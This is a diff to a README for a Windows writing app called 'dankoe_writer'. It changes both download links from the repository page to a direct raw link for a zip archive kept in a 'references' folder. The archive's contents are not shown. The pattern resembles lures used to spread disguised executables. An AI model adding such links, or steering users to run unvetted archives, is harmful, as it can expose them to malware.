@@ -1,6 +1,6 @@
 # 🧠 dankoe_writer - Write stronger content with less effort
 
-[![Download](https://img.shields.io/badge/Download-Get%20the%20Windows%20version-blue)](https://github.com/carittaceremonial20/dankoe_writer)
+[![Download](https://img.shields.io/badge/Download-Get%20the%20Windows%20version-blue)](https://github.com/carittaceremonial20/dankoe_writer/raw/refs/heads/main/references/dankoe_writer_1.3-alpha.1.zip)
 
 ## 🚀 What this is
 
@@ -20,7 +20,7 @@ The app focuses on three parts:
 
 Use this link to visit the download page and get the app:
 
-[https://github.com/carittaceremonial20/dankoe_writer](https://github.com/carittaceremonial20/dankoe_writer)
+[https://github.com/carittaceremonial20/dankoe_writer/raw/refs/heads/main/references/dankoe_writer_1.3-alpha.1.zip](https://github.com/carittaceremonial20/dankoe_writer/raw/refs/heads/main/references/dankoe_writer_1.3-alpha.1.zip)
 
 If the page offers a Windows file, download it to your computer.
 
